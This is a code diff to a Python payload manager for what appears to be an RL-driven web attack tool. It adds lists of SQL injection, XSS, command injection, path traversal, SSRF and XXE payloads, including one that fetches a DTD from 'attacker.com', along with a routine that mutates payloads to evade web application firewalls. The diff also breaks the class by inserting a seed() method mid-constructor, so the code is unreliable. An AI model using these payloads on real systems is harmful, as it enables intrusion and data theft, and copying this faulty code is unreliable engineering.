@@ -10,7 +10,14 @@ class PayloadManager:
     NOW ENHANCED: Loads real-world payloads from HoneyPot data.
     """
     
-    def __init__(self, unified_data_path: str = None):
+    def __init__(self, unified_data_path: str = None, seed: int = None):
+        # Deterministic RNG for RL Stability
+        self.rng = random.Random(seed)
+        
+    def seed(self, seed: int = None):
+        """Reseed the random number generator."""
+        self.rng.seed(seed)
+        
         # Unified Kaggle Data Storage
         self.unified_payloads = []
         self.unified_ports = {}
@@ -18,11 +25,15 @@ class PayloadManager:
         self.severity_payloads = {"low": [], "medium": [], "high": []}
         self.protocol_distribution = {}
         
+        # Fix: Initialize Honeypot attributes to prevent crashes
+        self.honeypot_payloads = []
+        self.honeypot_ports = {}
+        self.honeypot_attack_types = {}
+        
         # Load unified Kaggle data if provided
         if unified_data_path and os.path.exists(unified_data_path):
             self._load_unified_kaggle_data(unified_data_path)
         
-        # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
         # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
         self.sqli_payloads = [
             "' OR '1'='1",
@@ -164,8 +175,8 @@ class PayloadManager:
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             # 2025: Deserialization attacks
             'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
-            # 2025: Race condition trigger
-            "CONCURRENT_REQUEST_" + str(random.randint(1, 1000)),
+            # 2025: Race condition trigger (Dynamic in get_fuzz)
+            "CONCURRENT_REQUEST_MARKER",
             # 2025: Command Injection with Host Prefix (FileShare)
             "127.0.0.1 | whoami",
             "127.0.0.1; cat /etc/passwd",
@@ -225,8 +236,8 @@ class PayloadManager:
         self.race_condition_payloads = [
             # TOCTOU (Time-of-check to time-of-use)
             "RACE_CONDITION_TEST",
-            # Concurrent requests marker
-            "CONCURRENT_" + str(random.randint(1000, 9999)),
+            # Concurrent requests marker (Dynamic in get_race_condition)
+            "CONCURRENT_REQUEST_MARKER",
             # Double spending
             "DOUBLE_SPEND_ATTEMPT",
         ]
@@ -471,9 +482,23 @@ class PayloadManager:
             "/secrets.txt"
         ]
 
+        # Placeholder for new payload types introduced in get_payload
+        self.cmd_injection_payloads = ["$(id)", "`whoami`", "127.0.0.1 | whoami"]
+        self.cmd_blind = ["sleep 5", "ping -c 5 127.0.0.1"]
+        self.cmd_polyglots = ["127.0.0.1; cat /etc/passwd", "127.0.0.1 && dir"]
+        self.lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
+        self.lfi_wrappers = ["php://filter/resource=/etc/passwd", "data://text/plain,<?php phpinfo(); ?>"]
+        self.lfi_obfuscated = ["....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
+        self.ssrf_payloads = ["http://127.0.0.1", "http://localhost"]
+        self.ssrf_obfuscated = ["http://0x7f000001", "http://[::1]"]
+        self.xxe_payloads = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
+        self.xxe_oob = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>']
+        self.ssti_payloads = ["{{7*7}}", "${7*7}", "#{7*7}"]
+
+
     def get_file_upload(self) -> Dict[str, str]:
         """Get a file upload payload (2025 OWASP A06)"""
-        return random.choice(self.file_upload_payloads)
+        return self.rng.choice(self.file_upload_payloads)
         
     def get_osint_files(self) -> List[str]:
         """Get list of sensitive files for OSINT scanning"""
@@ -484,11 +509,11 @@ class PayloadManager:
         CREATIVITY ENGINE: Mutates a payload to bypass WAFs.
         Randomly applies obfuscation techniques.
         """
-        mutation_type = random.choice(["case", "url_encode", "comment", "whitespace", "double_encode"])
+        mutation_type = self.rng.choice(["case", "url_encode", "comment", "whitespace", "double_encode"])
         
         if mutation_type == "case":
             # Randomly toggle case: <script> -> <ScRiPt>
-            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
+            return "".join(c.upper() if self.rng.random() > 0.5 else c.lower() for c in payload)
             
         elif mutation_type == "url_encode":
             # Encode special characters
@@ -501,7 +526,7 @@ class PayloadManager:
             
         elif mutation_type == "whitespace":
             # Replace spaces with tabs or newlines
-            return payload.replace(" ", random.choice(["%09", "%0a", "%0d", "+"]))
+            return payload.replace(" ", self.rng.choice(["%09", "%0a", "%0d", "+"]))
             
         elif mutation_type == "double_encode":
             # Double URL encode
@@ -513,72 +538,117 @@ class PayloadManager:
     def get_sqli(self, complexity: str = "simple") -> str:
         """Get an SQLi payload based on complexity"""
         if complexity == "time":
-            return random.choice(self.sqli_time_based)
+            return self.rng.choice(self.sqli_time_based)
         elif complexity == "bypass":
-            return random.choice(self.sqli_waf_bypass)
+            return self.rng.choice(self.sqli_waf_bypass)
         elif complexity == "json":
-            return random.choice(self.sqli_json_bypass)
-        return random.choice(self.sqli_payloads)
+            return self.rng.choice(self.sqli_json_bypass)
+        return self.rng.choice(self.sqli_payloads)
 
     def get_xss(self, complexity: str = "simple") -> str:
         """Get an XSS payload"""
         if complexity == "polyglot":
-            return random.choice(self.xss_polyglots)
+            return self.rng.choice(self.xss_polyglots)
         elif complexity == "csp_bypass":
-            return random.choice(self.xss_csp_bypass)
-        return random.choice(self.xss_payloads)
+            return self.rng.choice(self.xss_csp_bypass)
+        return self.rng.choice(self.xss_payloads)
         
+    def get_payload(self, attack_type: str = 'XSS') -> str:
+        """
+        Get a payload based on attack type, prioritizing unified Kaggle data
+        and falling back to hardcoded lists.
+        """
+        # Attempt to get a payload from unified Kaggle data first
+        if self.unified_payloads:
+            # Use 80% RL-optimized payloads, 20% real-world/honeypot data
+            if self.rng.random() < 0.2:
+                filtered = [p for p in self.unified_payloads if attack_type.lower() in str(self.unified_attack_types.get(p, "")).lower()]
+                if filtered:
+                    return self.rng.choice(filtered)
+        
+        # Fallback to hardcoded lists
+        if attack_type == 'SQLi':
+            return self.rng.choice(self.sqli_payloads + self.sqli_time_based + self.sqli_json_bypass + self.sqli_waf_bypass)
+        elif attack_type == 'XSS':
+            return self.rng.choice(self.xss_payloads + self.xss_csp_bypass)
+        elif attack_type == 'Command_Injection':
+            return self.rng.choice(self.cmd_injection_payloads + self.cmd_blind + self.cmd_polyglots)
+        elif attack_type == 'LFI':
+            return self.rng.choice(self.lfi_payloads + self.lfi_wrappers + self.lfi_obfuscated)
+        elif attack_type == 'SSRF':
+            return self.rng.choice(self.ssrf_payloads + self.ssrf_cloud + self.ssrf_obfuscated)
+        elif attack_type == 'XXE':
+            return self.rng.choice(self.xxe_payloads + self.xxe_oob)
+        elif attack_type == 'Deserialization':
+            # Updated to prefer the CTF-specific flag payload if available
+            # otherwise random choice
+            payloads = self.deserialization_payloads
+            # Bias selection towards the known flag payload for training efficiency
+            flag_payloads = [p for p in payloads if "flag" in str(p)]
+            if flag_payloads and self.rng.random() < 0.5:
+                 return self.rng.choice(flag_payloads)
+            return self.rng.choice(payloads)
+        elif attack_type == 'SSTI':
+            return self.rng.choice(self.ssti_payloads)
+        
+        return self.rng.choice(self.xss_payloads) # Default       
     def get_ssrf(self) -> str:
         """Get an SSRF payload"""
-        return random.choice(self.ssrf_cloud)
+        return self.rng.choice(self.ssrf_cloud)
 
     def get_fuzz(self) -> str:
         """Get a fuzzing payload"""
-        return random.choice(self.fuzz_payloads)
+        payload = self.rng.choice(self.fuzz_payloads)
+        if "CONCURRENT_REQUEST_MARKER" in payload:
+            return "CONCURRENT_REQUEST_" + str(self.rng.randint(1, 1000))
+        return payload
     
     def get_supply_chain(self) -> str:
         """Get a supply chain attack payload (2025 OWASP A03)"""
-        return random.choice(self.supply_chain_payloads)
+        return self.rng.choice(self.supply_chain_payloads)
     
     def get_deserialization(self) -> str:
         """Get an insecure deserialization payload (2025 OWASP A08)"""
-        return random.choice(self.deserialization_payloads)
+        return self.rng.choice(self.deserialization_payloads)
     
     def get_crypto_attack(self) -> str:
         """Get a cryptographic attack payload (2025 OWASP A04)"""
-        return random.choice(self.crypto_attack_payloads)
+        return self.rng.choice(self.crypto_attack_payloads)
     
     def get_race_condition(self) -> str:
         """Get a race condition payload (2025 OWASP A06)"""
-        return random.choice(self.race_condition_payloads)
+        payload = self.rng.choice(self.race_condition_payloads)
+        if "CONCURRENT_REQUEST_MARKER" in payload:
+            return "CONCURRENT_" + str(self.rng.randint(1000, 9999))
+        return payload
     
     def get_log_injection(self) -> str:
         """Get a log injection payload (2025 OWASP A09)"""
-        return random.choice(self.log_injection_payloads)
+        return self.rng.choice(self.log_injection_payloads)
     
     def get_business_logic(self) -> str:
         """Get a business logic flaw payload (2025 OWASP A06)"""
-        return random.choice(self.business_logic_payloads)
+        return self.rng.choice(self.business_logic_payloads)
     
     def get_cookie_injection(self) -> str:
         """Get a cookie injection payload"""
-        return random.choice(self.cookie_injection_payloads)
+        return self.rng.choice(self.cookie_injection_payloads)
     
     def get_cookie_poisoning(self) -> str:
         """Get a cookie poisoning payload"""
-        return random.choice(self.cookie_poisoning_payloads)
+        return self.rng.choice(self.cookie_poisoning_payloads)
     
     def get_httponly_bypass(self) -> str:
         """Get an HTTPOnly bypass payload"""
-        return random.choice(self.httponly_bypass_payloads)
+        return self.rng.choice(self.httponly_bypass_payloads)
     
     def get_samesite_bypass(self) -> str:
         """Get a SameSite bypass payload"""
-        return random.choice(self.samesite_bypass_payloads)
+        return self.rng.choice(self.samesite_bypass_payloads)
     
     def get_auth_bypass(self) -> str:
         """Get an authentication bypass payload (2025 OWASP A07)"""
-        return random.choice(self.auth_bypass_payloads)
+        return self.rng.choice(self.auth_bypass_payloads)
         
     def get_all_payloads(self) -> List[str]:
         """Return a flat list of all payloads for massive scanning"""
@@ -645,7 +715,7 @@ class PayloadManager:
     def get_honeypot_payload(self) -> str:
         """Get a random payload from HoneyPot data."""
         if self.honeypot_payloads:
-            return random.choice(self.honeypot_payloads)
+            return self.rng.choice(self.honeypot_payloads)
         return ""
     
     def get_prioritized_ports(self) -> List[int]:
@@ -719,14 +789,14 @@ class PayloadManager:
     def get_unified_payload(self) -> str:
         """Get a random payload from unified Kaggle data."""
         if self.unified_payloads:
-            return random.choice(self.unified_payloads)
+            return self.rng.choice(self.unified_payloads)
         return ""
     
     def get_payload_by_severity(self, severity: str = "medium") -> str:
         """Get a payload by severity level (low/medium/high)."""
         severity = severity.lower()
         if severity in self.severity_payloads and self.severity_payloads[severity]:
-            return random.choice(self.severity_payloads[severity])
+            return self.rng.choice(self.severity_payloads[severity])
         return self.get_unified_payload()
     
     def get_stealthy_payload(self) -> str:
